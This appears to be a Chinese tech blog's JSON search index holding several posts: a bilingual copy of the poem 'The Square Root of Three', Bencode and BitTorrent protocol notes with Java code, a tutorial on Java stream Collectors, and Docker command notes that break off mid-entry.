[{"title":"孤独的根号三","url":"/%E5%85%B6%E4%BB%96/%E5%85%B6%E4%BB%96/%E5%AD%A4%E7%8B%AC%E7%9A%84%E6%A0%B9%E5%8F%B7%E4%B8%89/","content":"作者作品名称\t孤独的根号三外文名\tTheSquareRootofThree作者\t\tDavidFeinberg创作年代\t2008年\n英文I fear that I will always be A lonely number like root threeA three is all that’s good and rightWhy must my three keep out of sight Beneath a vicious square-root sign?I wish instead I were a nineFor nine could thwart this evil trick With just some quick arithmeticI know I’ll never see the sunAs 1.7321Such is my reality A sad irrationalityWhen,hark, just what is this I see?Another square root of a threeHas quietly come waltzing byTogether now we multiplyTo form a number we preferRejoicing as an integerWe break free from our mortal bondsAnd with a wave of magic wandsOur square-root signs become ungluedAnd love for me has been renewedI can’t promise you the kind of lifestyle that fairy tale likeAnd I can’t promise you that I’m gonna mature overnightBut what I can promise you is that I will always love youAnd I will never try and make you into something that you can not\n中文我害怕我会永远是那孤独的根号三三本身是一个多么美妙的数字我的这个三为何躲在那难看的根号下我多么希望自己是一个九因为九只需要一点点小小的运算便可摆脱这残酷的厄运我知道自己很难再看到自己的太阳就像这无休无止的1.7321我不愿我的人生如此可悲直到那一天我看到了另一个根号三如此美丽无瑕翩翩舞动而来我们彼此相乘得到那梦寐以求的数字像整数一样圆满我们砸碎命运的枷锁轻轻舞动爱情的魔杖我们的平方根 已经解开我的爱重获新生我无法保证能给你童话般的世界也无法保证自己能在一夜之间长大但是我保证你可以向公主一样永远生活在自由 幸福之中\n","categories":["其他"],"tags":["诗歌"]},{"title":"Bencode编码","url":"/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Bencode%E7%BC%96%E7%A0%81/","content":"BencodeBencode（发音为Bee-Encode）是 BitTorrent 用在传输数据结构的编码方式。\n这种编码方式支持四种资料类型：\n\n字符串\n整数\n串列\n字典表\n\nBencode 最常被用在 .torrent 档中，文件里的元数据都是被 Bencode 编码过的字典表。这种编码方法也被 Tracker 返回响应时使用。\n虽然比用纯二进制编码效率低，但 Bencode 结构简单而且不受字节存储顺序影响（所有数字以十进制编码），这对于跨平台性非常重要。并且，Bencode具有较好的灵活性，即使存在故障的字典键，只要将其忽略并更换新的就能兼容补充。\n编码方法Bencode 使用 ASCII 字符进行编码。\nBencode（BitTorrent 编码）是一种简单且轻量级的序列化格式，主要用于 BitTorrent 协议中的元数据文件（.torrent 文件）。Bencode支持四种基本类型：整数、字符串、列表和字典。下面是 Bencode 的详细介绍，包括其语法、数据类型和一些示例。\n\n整数\n语法：i&lt;数字&gt;e int 整数 end\n示例：i123e 表示整数 123\n\n负数和零也是有效的，例如 i-123e 表示 -123，i0e 表示 0，但是不可以使用 i-0e 包括其他除了i0e的具有前导0的（i03e）都是无效的。\n\n\n\n\n字符串\n语法：&lt;长度&gt;:&lt;字符串&gt;\n示例：4:spam 表示字符串 “spam”\n\n长度是指字符串的字节数，而不是字符数\n\n\n\n\n列表\n语法：l&lt;元素1&gt;&lt;元素2&gt;...e list 列表 end\n示例：l4:spam3:fooi42ee 表示列表 [&quot;spam&quot;, &quot;foo&quot;, 42]\n\n列表中的元素可以是任何 Bencode 支持的类型\n\n\n\n\n字典\n语法：d&lt;键1&gt;&lt;值1&gt;&lt;键2&gt;&lt;值2&gt;...e dictionary 字典 end\n示例：d3:bar4:spam3:fooi42ee 表示字典 {&quot;bar&quot;: &quot;spam&quot;, &quot;foo&quot;: 42}\n\n字典中的键必须是字符串，并且按键的字典序排序\n\n\n\n\n\n复杂结构的 Bencode 示例：包含嵌套结构的 Bencode\nd8:announce22:https://tracker.example.com/announce4:infod6:lengthi1000e4:name4:file15:piece lengthi262144e6:pieces20:0123456789abcdef0123456789abcdefe\n\n表示一个包含嵌套字典和列表的复杂结构，类似于以下 JSON：\n&#123;  &quot;announce&quot;: &quot;https://tracker.example.com/announce&quot;,  &quot;info&quot;: &#123;    &quot;length&quot;: 1000,    &quot;name&quot;: &quot;file&quot;,    &quot;piece length&quot;: 262144,    &quot;pieces&quot;: &quot;0123456789abcdef0123456789abcdef&quot;  &#125;&#125;\n\nBencode 编解码实现package com.example.kernel.util;import java.util.ArrayList;import java.util.LinkedHashMap;import java.util.List;import java.util.Map;public class BencodeUtils &#123;    // 编码方法    public static String encode(Object obj) &#123;        StringBuilder sb = new StringBuilder();        if (obj == null) &#123;            return &quot;&quot;;        &#125;        switch (obj) &#123;            case Map&lt;?, ?&gt; map -&gt; &#123;                sb.append(&quot;d&quot;);                for (Map.Entry&lt;?, ?&gt; entry : map.entrySet()) &#123;                    sb.append(encode(entry.getKey()));                    sb.append(encode(entry.getValue()));                &#125;                sb.append(&quot;e&quot;);            &#125;            case Integer ignored -&gt; sb.append(&quot;i&quot;).append(obj).append(&quot;e&quot;);            case List&lt;?&gt; list -&gt; &#123;                sb.append(&quot;l&quot;);                for (Object item : list) &#123;                    sb.append(encode(item));                &#125;                sb.append(&quot;e&quot;);            &#125;            case String str -&gt; sb.append(str.length()).append(&#x27;:&#x27;).append(str);            case null, default -&gt; throw new IllegalArgumentException(&quot;Unsupported type: &quot; + obj.getClass());        &#125;        return sb.toString();    &#125;    // 解码方法    public static Object decode(byte[] s) &#123;        Object o = null;        if (s == null || s.length == 0) &#123;            return o;        &#125;        o = decodeObject(s, 0)[0];        return o;    &#125;    // 辅助方法：解码对象    private static Object[] decodeObject(byte[] s, int index) &#123;        byte b = s[index];        if (b == &#x27;i&#x27;) &#123;            // 整数类型            index++;            int start = index;            while (s[index] != &#x27;e&#x27;) &#123;                index++;            &#125;            long value = Long.parseLong(new String(s, start, index - start));            index++;            return new Object[]&#123;value, index&#125;;        &#125; else if (&#x27;0&#x27; &lt;= b &amp;&amp; b &lt;= &#x27;9&#x27;) &#123;            // 字符串类型            int start = index;            while (s[index] != &#x27;:&#x27;) &#123;                index++;            &#125;            int length = Integer.parseInt(new String(s, start, index - start));            index++;            String str = new String(s, index, length);            index += length;            return new Object[]&#123;str, index&#125;;        &#125; else if (b == &#x27;d&#x27;) &#123;            // 字典类型            index++;            Map&lt;String, Object&gt; map = new LinkedHashMap&lt;&gt;();            while (s[index] != &#x27;e&#x27;) &#123;                Object[] keyResult = decodeObject(s, index);                String key = (String) keyResult[0];                index = (int) keyResult[1];                Object[] valueResult = decodeObject(s, index);                Object value = valueResult[0];                index = (int) valueResult[1];                map.put(key, value);            &#125;            index++;            return new Object[]&#123;map, index&#125;;        &#125; else if (b == &#x27;l&#x27;) &#123;            // 列表类型            index++;            List&lt;Object&gt; list = new ArrayList&lt;&gt;();            while (s[index] != &#x27;e&#x27;) &#123;                Object[] result = decodeObject(s, index);                list.add(result[0]);                index = (int) result[1];            &#125;            index++;            return new Object[]&#123;list, index&#125;;        &#125; else &#123;            // 忽略无效的字符            index++;            return decodeObject(s, index);        &#125;    &#125;&#125;\n\n","categories":["学习笔记"],"tags":["java","Bencode编码","BitTorrent","p2p"]},{"title":"BitTorrent协议","url":"/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/BitTorrent%E5%8D%8F%E8%AE%AE/","content":"BitTorrent协议规范BitTorrent是一个用于分发文件的协议。它通过URL识别内容，并设计为与网络无缝集成。与普通HTTP相比，它的优势在于，当多个用户同时下载同一文件时，下载者之间会互相上传，这使得文件源能够以适度的负载支持大量下载者。\nBitTorrent文件分发包括以下实体：\n\n普通Web服务器\n静态“元信息”文件\nBitTorrent跟踪器\n“原始”下载者\n终端用户的Web浏览器\n终端用户的下载器\n\n理想情况下，一个文件应该有多个终端用户。\n服务端准备步骤：\n启动一个跟踪器（或更可能是已经在运行一个）。\n启动一个普通的Web服务器，例如Apache，或已经有一个。\n将.torrent扩展名与MIME类型application&#x2F;x-bittorrent关联（或已经完成）。\n使用要服务的完整文件和跟踪器的URL生成一个元信息（.torrent）文件。\n将元信息文件放置在Web服务器上。\n从其他网页链接到元信息（.torrent）文件。\n启动一个已经拥有完整文件的下载器（“原点”）。\n\n用户下载步骤：\n安装BitTorrent（或已经完成）。\n浏览网页。\n点击.torrent文件的链接。\n选择在本地保存文件的位置，或选择恢复部分下载。\n等待下载完成。\n告诉下载器退出（在这之前，它会继续上传）。\n\nbencoding\n字符串以长度前缀表示，后跟一个冒号和字符串。例如，4:spam对应于“spam”。\n整数以“i”开头，后跟十进制数字，再以“e”结束。例如，i3e对应于3，i-3e对应于-3。整数没有大小限制。i-0e是无效的。以零开头的所有编码，例如i03e，都是无效的，除了i0e，它当然对应于0。\n列表以“l”开头，后跟其元素（也经过bencoding编码），最后以“e”结束。例如，l4:spam4:eggse对应于[‘spam’, ‘eggs’]。\n字典以“d”开头，后跟一个交替的键值对列表，最后以“e”结束。例如，d3:cow3:moo4:spam4:eggse对应于{‘cow’: ‘moo’, ‘spam’: ‘eggs’}，而d4:spaml1:a1:bee对应于{‘spam’: [‘a’, ‘b’]}。键必须是字符串并按排序顺序出现（按原始字符串排序，而非字母数字）。\n\n元信息文件元信息文件（也称为.torrent文件）是一个bencoded字典，包含以下键：\n\nannounce：跟踪器的URL。\ninfo：映射到一个字典，下面描述了其键。\n\n所有包含文本的.torrent文件中的字符串必须是UTF-8编码。\ninfo字典\nname：键映射到一个UTF-8编码的字符串，建议将文件（或目录）保存为的名称。这是纯粹的建议。\npiece length：映射到文件分割成的每个片段的字节数。为了传输，文件被分割成固定大小的片段，除非最后一个片段可能被截断，所有片段通常都是相同长度的。piece length几乎总是2的幂，最常见的是2^18 &#x3D; 256 K（BitTorrent在3.2版本之前使用2^20 &#x3D; 1 M作为默认值）。\npieces：映射到一个长度是20的倍数的字符串。它被细分为长度为20的字符串，每个字符串是相应索引的片段的SHA1哈希。\n\n还可以有一个length或files键，但不能同时存在。如果length存在，则下载表示单个文件；否则，它表示一组在目录结构的文件。在单文件情况下，length映射到文件的字节长度。\n在其他键的目的上，多文件情况被视为只有一个文件，通过按文件列表中出现的顺序连接文件。文件列表的值是files，映射到一个字典列表，包含以下键：\n\nlength：文件的字节长度。\npath：对应子目录名称的UTF-8编码字符串列表，最后一个是实际文件名（零长度列表是错误情况）。\n\n在单文件情况下，name键是文件名；在多文件情况下，它是目录名。\n跟踪器跟踪器的GET请求具有以下键：\n\ninfo_hash：bencoded形式的info值的20字节SHA1哈希。该值几乎肯定需要进行转义。请注意，这个值是元信息文件的一个子串。info-hash必须是编码形式的哈希，正如在.torrent文件中找到的那样，这与b解码元信息文件、提取info字典并编码相同，仅当bencode完全验证输入（例如，键排序、没有前导零）时才能这样做。相反，这意味着客户端必须拒绝无效的元信息文件，或者直接提取子串。它们不得在无效数据上进行解码-编码的循环。\npeer_id：下载器使用的长度为20的字符串作为其ID。每个下载器在新的下载开始时随机生成自己的ID。该值也几乎肯定需要进行转义。\nip：可选参数，给出该对等体的IP（或DNS名称）。通常用于原点，如果它与跟踪器在同一台机器上。\nport：该对等体正在监听的端口号。通常的行为是下载器尝试监听6881端口，如果该端口已被占用，则尝试6882、6883等，并在6889之后放弃。\nuploaded：到目前为止，总共上传的量，以十进制ASCII编码。\ndownloaded：到目前为止，总共下载的量，以十进制ASCII编码。\nleft：该对等体仍需下载的字节数，以十进制ASCII编码。请注意，这不能从下载量和文件长度计算出来，因为它可能是恢复下载，且有可能部分下载的数据未通过完整性检查，必须重新下载。\nevent：这是一个可选键，映射到started、completed或stopped（或空，表示与不出现时相同）。如果不存在，则这是定期进行的公告之一。当下载首次开始时，会发送使用started的公告；当下载完成时，会发送使用completed的公告。如果文件在开始时已完成，则不会发送completed。下载者在停止下载时发送一个使用stopped的公告。\n\n跟踪器响应是bencoded字典。如果跟踪器响应有一个键failure reason，则它映射到一个可读字符串，解释查询失败的原因，且不需要其他键。否则，它必须有两个键：interval，映射到下载器应该等待的秒数，以便进行定期重新请求，和peers。peers映射到对应对等体的字典列表，每个字典包含peer id、ip和port键，分别映射到对等体自选的ID、IP地址或DNS名称作为字符串和端口号。请注意，下载者在发生事件或需要更多对等体时，可以在非预定时间重新请求。\n更常见的是，跟踪器返回对等体列表的紧凑表示，见BEP 23。如果您想对元信息文件或跟踪器查询进行任何扩展，请与Bram Cohen协调，以确保所有扩展都是兼容的。通常通过UDP跟踪器协议进行公告。\n对等协议BitTorrent的对等协议通过TCP或uTP运行。对等连接是对称的。双向发送的消息看起来相同，数据可以在任一方向流动。\n对等协议通过索引引用文件的片段，如元信息文件中所描述，从零开始。当对等体完成下载一个片段并检查哈希匹配时，它会向所有对等体宣布它拥有该片段。连接在两端包含两个状态位：阻塞或不阻塞，以及感兴趣或不感兴趣。阻塞是一个通知，在解除阻塞之前不会发送任何数据。阻塞背后的原因和常见技术将在本文档后面解释。\n数据传输发生在一个对等体（peer）感兴趣而另一个对等体没有被阻塞（unchoked）时。兴趣状态必须始终保持更新——当下载者在未被阻塞的情况下，发现没有什么需要请求的内容时，他们必须表达缺乏兴趣，即使他们当前被阻塞。这一过程的实现比较复杂，但这样做的目的是让下载者能够知道，哪些对等体在解除阻塞后会立即开始下载。\n连接开始时被阻塞且不感兴趣。当数据正在传输时，下载者应同时保持多个片段请求排队，以获得良好的TCP性能（这被称为“流水线”）。另一方面，无法立即写入TCP缓冲区的请求应在内存中排队，而不是保留在应用程序级别的网络缓冲区，以便在发生阻塞时可以全部丢弃。对等协议的消息流由握手开始，后跟一个永无止境的长度前缀消息流。握手以字符19（十进制）开头，后跟字符串“BitTorrent protocol”。前导字符是长度前缀，旨在希望其他新协议也能这样做，从而彼此显著区分。所有后续发送的整数都以四字节大端格式编码。在固定头之后，有八个保留字节，当前实现中都为零。如果您希望使用这些字节扩展协议，请与Bram Cohen协调，以确保所有扩展都是兼容的。\n接下来是元信息文件中info值的20字节SHA1哈希（这是跟踪器上公告为info_hash的相同值，只是在这里是原始的而不是引用的）。如果双方发送的值不相同，则断开连接。一个可能的例外是，如果下载者希望通过单个端口进行多个下载，他们可能会等待传入连接首先提供下载哈希，并在其列表中如果存在则响应相同的值。握手之后，接下来是一个交替的长度前缀和消息的流。长度为零的消息是保持活跃消息，忽略。保持活跃消息通常每两分钟发送一次，但在期望数据时超时可以更快完成。\n对等消息所有非保持活跃消息以一个单字节开头，表示其类型。\n可能的值是：\n\n0 - choke\n1 - unchoke\n2 - interested\n3 - not interested\n4 - have\n5 - bitfield\n6 - request\n7 - piece\n8 - cancel\n\n“choke”、“unchoke”、“interested”和“not interested”没有负载。“bitfield”只在首次消息中发送。其负载是一个比特字段，下载者发送的每个索引设置为1，其余设置为0。尚未拥有任何内容的下载者可以跳过“bitfield”消息。比特字段的第一个字节对应于高位到低位的索引0-7，第二个字节对应于8-15，以此类推。末尾的闲置位设置为零。“have”消息的负载是一个单一数字，即该下载者刚刚完成并检查哈希的索引。“request”消息包含索引、开始和长度。最后两个是字节偏移。长度通常是2的幂，除非在文件末尾被截断。所有当前实现使用2^14（16 KiB），并关闭请求大于该量的连接。“cancel”消息的负载与请求消息相同。它们通常仅在下载接近完成时发送，在所谓的“结束模式”下。当下载几乎完成时，最后几个片段通常全部从一个拥挤的调制解调器线路下载，耗时很长。为了确保最后几个片段快速到达，一旦所有该下载者尚未拥有的片段的请求正在进行，它会向所有正在下载的对等体发送请求。为了避免效率低下，它在每次接收到片段时向其他所有对等体发送取消。“piece”消息包含索引、开始和片段。请注意，它们与请求消息隐含相关。如果在快速连续发送的阻塞和解除阻塞消息中，可能会收到意外的片段。\n下载者通常以随机顺序下载片段，这样可以合理地避免拥有任何对等体的片段的严格子集或超集。阻塞是出于多种原因。TCP拥塞控制在同时通过多个连接发送时表现非常差。此外，阻塞让每个对等体使用一种互惠算法，确保它们获得一致的下载速度。\n以下描述的阻塞算法是当前部署的算法。所有新算法在由它们自身组成的网络中和以此为主的网络中都应良好运作。一个好的阻塞算法应满足多个标准。它应限制同时上传的数量以确保良好的TCP性能。它应避免快速阻塞和解除阻塞，这称为“颤动”。它应对让其下载的对等体进行互惠。最后，它应偶尔尝试未使用的连接，以查找它们是否可能比当前使用的连接更好，这称为乐观解除阻塞。\n当前部署的阻塞算法通过每十秒钟仅更改被阻塞的对象，避免了颤动。它通过解除四个上传速率最佳且感兴趣的对等体来实现互惠和上传数量的限制。那些上传速率更好但不感兴趣的对等体会被解除阻塞，如果它们变得感兴趣，则最差的上传者会被阻塞。如果下载者拥有完整文件，它会使用其上传速率而非下载速率来决定解除哪个对等体的阻塞。在乐观解除阻塞方面，任何时候都有一个对等体被解除阻塞，无论其上传速率如何（如果感兴趣，它会算作四个允许的下载者之一）。被乐观解除阻塞的对等体每30秒轮换一次。为了给它们一个良好的机会上传完整的片段，新连接比当前乐观解除阻塞的连接更有三倍的可能性。\n参考The BitTorrent Protocol Specification\n","categories":["学习笔记"],"tags":["Bencode编码","BitTorrent","p2p"]},{"title":"Collector收集器的使用","url":"/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Collector%E6%94%B6%E9%9B%86%E5%99%A8%E7%9A%84%E4%BD%BF%E7%94%A8/","content":"前言之前写过一些 stream 流的用法。从那之后，用 stream 流就用的很开心。但是，有时候也会疑惑。stream 流最后的终止操作，经常会这么写：list.stream().collect(Collectors.toList());虽然知道是将流的数据收集到 list 集合中，但不知道为什们这么写。而且，也有这种简化写法：list.stream().toList()。在 Java16 才加入了这个写法。更让人想知道，Collectors 返回的 Collector 收集器到底怎么使用？\n另外，toList() 与 Collectors.toList() 是有区别的。查看源码，可以看到 toList() 返回的是不可变的 list。而 Collectors.toList() 返回的是可变的 list。\ndefault List&lt;T&gt; toList() &#123;     return (List&lt;T&gt;) Collections.unmodifiableList(new ArrayList&lt;&gt;(Arrays.asList(this.toArray()))); &#125;\n\npublic static &lt;T&gt;Collector&lt;T, ?, List&lt;T&gt;&gt; toList() &#123;    return new CollectorImpl&lt;&gt;(ArrayList::new, List::add,                               (left, right) -&gt; &#123; left.addAll(right); return left; &#125;,                               CH_ID);&#125;\n\n后面，来说 Collector 的用法。\ncollect、Collector、Collectors 区别与关联\ncollect 是 Stream 流的一个终止方法，会使用传入的收集器（入参）对结果执行相关的操作，这个收集器必须是 Collector 接口的实现类。\nCollector 是一个接口，定义了一些方法，作用是将 Stream 流中的数据收集到集合中。\nCollectors 是一个工具类，提供了很多的静态工厂方法，提供了很多常用的 Collector 接口的具体实现类，方便使用。\n\nCollector 接口Collector 在 javadoc 中的描述是这样的：\n\nA mutable reduction operation that accumulates input elements into a mutable result container, optionally transforming the accumulated result into a final representation after all input elements have been processed. Reduction operations can be performed either sequentially or in parallel.\n\nCollector是一种可变的汇聚操作，它将输入元素累积到一个可变的结果容器中。在所有的元素处理完成后，Collector 将累积的结果转换成一个最终的表示（这是一个可选的操作）。Collector支持串行和并行两种方式执行。\n先来简单看下 Collector 接口的源码（省略两个静态 of 方法，用于构造 Collector 实现类）\npublic interface Collector&lt;T, A, R&gt; &#123;    Supplier&lt;A&gt; supplier();    BiConsumer&lt;A, T&gt; accumulator();    BinaryOperator&lt;A&gt; combiner();    Function&lt;A, R&gt; finisher();    Set&lt;Characteristics&gt; characteristics();    enum Characteristics &#123;        CONCURRENT,        UNORDERED,        IDENTITY_FINISH    &#125;    // ...&#125;\n\nCollector 接口定义了 3 个泛型、5 个接口方法、2个静态方法、3 个枚举值。\n泛型含义\nT：输入元素的类型\nA：累积结果的容器类型\nR：最终生成的结果类型\n\n接口方法含义\nsupplier 方法：用来创建一个新的可变的集合。换句话说 Supplier 用来创建一个初始的集合。\naccumulator 方法：定义了累加器，用来将原始元素添加到集合中。\ncombiner 方法：用于对并行操作生成的各个子集合结果进行合并。只有并行流会被调用。\nfinisher 方法：对遍历结束后的流做最后处理。可以省略，省略就是 i -&gt; (R) i;，恒等操作。\ncharacteristics：返回一个不可变的 Characteristics 集合。它定义了收集器的行为，关于流是否可以并行归约，以及可以使用哪些优化的提示。\n\n前四个方法都是函数式接口，可以用 lambda 表达式简化表示。所以下面示例时使用 lambda，不单独创建实现类。\n静态方法两个重载的静态方法 of 都用于构造 Collector 实现类。区别在于是否省略 finisher 方法。最后一个参数是 characteristics 枚举，为可变长度参数列表，可传多个。\n枚举值含义\nUNORDERED：声明此收集器的汇总归约结果与 Stream 流元素遍历顺序无关，不受元素处理顺序影响。但是如果容器本身是有序的，那么这个收集器会保证元素顺序不变。\nCONCURRENT：声明此收集器可以多个线程并行处理，允许并行流中进行处理。即 supplier 方法只会被调用一次，只创建一个结果容器，并且 combiner 方法不会被执行，这个容器必须是线程安全的。\nIDENTITY_FINISH：声明此收集器的 finisher 方法是一个恒等操作，可以跳过。默认值。\n\n\n需要注意的是即使 collector 被标记为 UNORDERED 如果数据源或操作本身是有序的，那么系统的执行策略通常仍会保持这些元素的出现顺序。由于在处理有序流时多个线程并发更新同一个共享的累加器容器，会导致元素的更新顺序变得不确定。所以系统通常会忽略有序源的 CONCURRENT 标记。除非同时还指定了 UNORDERED。\n\n自定义 Collector 实现类有一个数组 a,b,c,d,e,f,g下面通过自定义的 collector 实现，返回一个 本身为 key，ascii 码为值的 map 集合。同时，通过打印信息区分串行流与并行流的执行区别。\n串行流（单线程顺序执行）\npublic static void main(String[] args) &#123;    Map&lt;String, Integer&gt; res = Stream.of(&quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;, &quot;e&quot;, &quot;f&quot;, &quot;g&quot;)            .collect(Collector.of(                    () -&gt; &#123;                        System.out.println(Thread.currentThread().getName() + &quot; supplier...&quot;);                        return new HashMap&lt;String, Integer&gt;();                    &#125;,                    (left, right) -&gt; &#123;                        System.out.println(Thread.currentThread().getName() + &quot; accumulator: &quot; + right);                        left.put(right, (int) right.getBytes()[0]);                    &#125;,                    (left, right) -&gt; &#123;                        System.out.println(Thread.currentThread().getName() + &quot; combiner: &quot; + left + &quot;+&quot; + right);                        left.putAll(right);                        return left;                    &#125;            ));    res.forEach((k, v) -&gt; System.out.println(k + &quot;:&quot; + v.toString()));&#125;\n\n串行流输出结果：\nmain supplier...main accumulator: amain accumulator: bmain accumulator: cmain accumulator: dmain accumulator: emain accumulator: fmain accumulator: ga:97b:98c:99d:100e:101f:102g:103\n\n可以看到串行流中 supplier 方法只执行一次，并且 combiner 方法没有执行。\n并行流\npublic static void main(String[] args) &#123;    Map&lt;String, Integer&gt; res = Stream.of(&quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;, &quot;e&quot;, &quot;f&quot;, &quot;g&quot;).parallel()            .collect(Collector.of(                    () -&gt; &#123;                        System.out.println(Thread.currentThread().getName() + &quot; supplier...&quot;);                        return new HashMap&lt;String, Integer&gt;();                    &#125;,                    (left, right) -&gt; &#123;                        System.out.println(Thread.currentThread().getName() + &quot; accumulator: &quot; + right);                        left.put(right, (int) right.getBytes()[0]);                    &#125;,                    (left, right) -&gt; &#123;                        System.out.println(Thread.currentThread().getName() + &quot; combiner: &quot; + left + &quot;+&quot; + right);                        left.putAll(right);                        return left;                    &#125;            ));    res.forEach((k, v) -&gt; System.out.println(k + &quot;:&quot; + v.toString()));&#125;\n\n并行流输出结果：\nmain supplier...ForkJoinPool.commonPool-worker-1 supplier...ForkJoinPool.commonPool-worker-2 supplier...ForkJoinPool.commonPool-worker-4 supplier...ForkJoinPool.commonPool-worker-5 supplier...ForkJoinPool.commonPool-worker-3 supplier...ForkJoinPool.commonPool-worker-6 supplier...ForkJoinPool.commonPool-worker-4 accumulator: dForkJoinPool.commonPool-worker-1 accumulator: bmain accumulator: eForkJoinPool.commonPool-worker-6 accumulator: cForkJoinPool.commonPool-worker-2 accumulator: aForkJoinPool.commonPool-worker-3 accumulator: gForkJoinPool.commonPool-worker-5 accumulator: fForkJoinPool.commonPool-worker-6 combiner: &#123;b=98&#125;+&#123;c=99&#125;ForkJoinPool.commonPool-worker-6 combiner: &#123;a=97&#125;+&#123;b=98, c=99&#125;ForkJoinPool.commonPool-worker-5 combiner: &#123;f=102&#125;+&#123;g=103&#125;main combiner: &#123;d=100&#125;+&#123;e=101&#125;main combiner: &#123;d=100, e=101&#125;+&#123;f=102, g=103&#125;main combiner: &#123;a=97, b=98, c=99&#125;+&#123;d=100, e=101, f=102, g=103&#125;a:97b:98c:99d:100e:101f:102g:103\n\n可以看出并行流的执行逻辑。\n\nspliterator 分割迭代器 会将数据分割成多个片段，分割过程通常采用递归的方式动态进行，以平衡子任务的工作负载，提高资源利用率。\nFork&#x2F;Join 框架将这些数据片段分配到多个线程和处理器核心上进行并行处理。\n处理完成后，结果会被汇总合并。合并过程通常也是递归进行的。\n\nCollectors 常用收集器Collectors 提供了一系列的静态方法，一般情况下足够正常使用。不然我也不会用这么久 stream 才来详细了解 Collector 了。\n方法比较多，很多我也没用过。这里就不一一列举用法了。用的时候查文档吧。不然我和写文档有什么区别\n","categories":["学习笔记"],"tags":["java","stream"]},{"title":"docker笔记","url":"/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Docker%E7%AC%94%E8%AE%B0/","content":"简介虚拟化虚拟化是一种计算机资源管理技术。指通过虚拟化技术将一台计算机虚拟为多台逻辑计算机。在一台计算机上同时运行多个逻辑计算机，每个逻辑计算机可运行不同的操作系统，并且应用程序都可以在相互独立的空间内运行而互不影响，从而显著提高计算机的工作效率。  \n虚拟化分类（略，因为过于复杂，了解即可）  \n优点：一台物理机可以虚拟化多个服务器，让计算机资源利用更充分。缺点：\n\n每个虚拟机都会创建一个操作系统，会增加资源的消耗。\n环境兼容问题。\n\n容器技术运行在操作系统之上的虚拟化技术，模拟的运行在一个操作系统上的多个不同进程，封装在容器中。  \ndocker发布于2013年，基于LXC技术。LXC是linux Container，是一种内核虚拟化技术。提供轻量级的虚拟化，以便隔离进程和资源。与宿主机使用同一内核，性能损耗小。\ndocker是开源的应用容器引擎，基于go语言实现。docker官网docker技术可以让开发者将开发好的应用和依赖包打包到容器中，以便可以运行在任意linux服务器上，解决开发环境与运维环境不同的问题。docker本省不是容器，是管理容器的引擎。  \n环境搭建安装docker支持CentOS6及以上版本。CentOS7可以使用yum install docker -y直接安装。  \n\n服务启动关闭等启动：systemctl start docker或者service docker start停止：systemctl stop docker或者service docker stop重启：systemctl restart docker或者service docker restart查看运行状态：systemctl status docker或者service docker status\n查看docker系统信息：docker info查看docker所有帮助信息：docker查看某个命令帮助信息：docker commond --help\ndocker运行机制启动服务–&gt;下载镜像–&gt;启动该镜像得到一个容器–&gt;容器里运行应用\n\n启动服务\n下载镜像，如果本地没有对应镜像，则会从镜像仓库下载，默认仓库搜索镜像：docker search tomcat下载镜像：docker pull tomcat运行镜像：docker run tomcat 后台运行：docker run -d tomcat-p 参数映射端口显示本地已有镜像：docker images\n\n进入docker容器进入容器：docker exec -it 容器id bashi表示交互式的，即保持标准输入流打开t表示虚拟控制台退出容器：exit\n从客户机访问容器，需要有端口映射，docker容器默认采用桥接模式与宿主机通信，需要将宿主机ip端口映射到容器ip端口上。停止容器：docker stop 容器id/名称启动容器：docker run -d -p 8080:8080 tomcat\ndocker核心组件docker是客户端-服务器（C&#x2F;S）加厚，通过远程API来管理和创建容器。docker通过镜像来创建容器。  \n镜像镜像是一个只读的模板，用于创建容器。\n镜像由许多层文件系统构成第一层是引导文件系统bootfs第二层是root文件系统rootfs，root文件系统通常是某种操作系统root系统之上又有很多层文件系统，这些文件系统叠加在一起，构成docker中的镜像\n进入容器：docker exit -it 镜像id bash删除镜像：docker rmi 镜像名，rm是删除容器\n容器通过镜像启动容器：docker run -d 镜像名查看运行中的容器：docker ps查看所有的容器：docker ps -a停止容器：docker stop 容器id/名称开启容器：docker start 容器id/名称删除容器：docker rm 容器id/名称 删除容器时，容器必须是静止状态，否则会报错查看容器更多信息：docker inspect 容器id/名称停止全部运行中的容器：docker stop $(docker ps -q)删除全部容器：docker rm $(docker ps -aq)\n仓库仓库是集中存放镜像文件的地方。仓库分为公开仓库和私有仓库。最大的公开仓库是Docker Hub\n阿里云镜像\n查找官方镜像：docker search 镜像名下载镜像：docker pull 镜像名\n自定义镜像dockerfile用于构建docker镜像，有一行行命令语句构成，基于这些命令可以构建一个镜像。  \ndockerfile分为四部分\n\n基础镜像信息\n维护者信息\n镜像操作命令\n容器启动时执行指令\n\n指令\nFROMFROM &lt;images&gt; / FROM &lt;images&gt;:&lt;tag&gt; / FROM &lt;images&gt;:&lt;digest&gt;用于指定所使用的基础镜像\nFROM必须是dockerfile第一条非注释指令FROM可以出现多次，用于在一个dockerfile中创建多个镜像tag&#x2F;digest是可选的，默认latest版本基础镜像\n\n\nMAINTAINERMAINTAINER &lt;name&gt;指定维护者信息\nENVENV &lt;key&gt; &lt;value&gt; / ENV &lt;key1&gt;=&lt;value1&gt; &lt;key2&gt;=&lt;value2&gt;...设置环境变量，会被后续RUN指令使用，并在容器运行时保持。\nCOPYADD &lt;源路径&gt;... &lt;目标路径&gt; / ADD [&quot;&lt;源路径&gt;&quot;,... &quot;&lt;目标路径&gt;&quot;]复制指定文件到容器中指定位置。\n源文件的各种元数据都会保留。比如读、写、执行权限、文件变更时间等。\n\n\nADDADD &lt;源路径&gt;... &lt;目标路径&gt; / ADD [&quot;&lt;源路径&gt;&quot;,... &quot;&lt;目标路径&gt;&quot;]复制指定文件到容器中指定位置，与COPY格式基本一致，但比COPY增加了一些功能。如源路径可以是url\n如果 docker 发现文件内容被改变，则接下来的指令都不会再使用缓存。\n\n\nRUN\n\n#shell格式RUN &lt;command&gt;#exec格式RUN [&quot;executable&quot;, &quot;param1&quot;, &quot;param2&quot;]\n用于构建过程中，执行特定命令，并生成一个中间镜像。  \n\nRUN 